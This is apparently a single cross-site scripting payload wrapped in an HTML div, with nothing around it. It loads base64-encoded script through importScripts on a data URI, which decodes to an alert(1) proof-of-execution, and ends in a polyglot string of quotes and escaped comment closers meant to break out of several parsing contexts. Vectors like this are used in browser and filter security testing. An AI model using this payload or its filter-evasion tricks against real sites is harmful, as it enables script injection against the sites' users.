<div id="4">0? :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`--&gt;]]&gt;]</div>
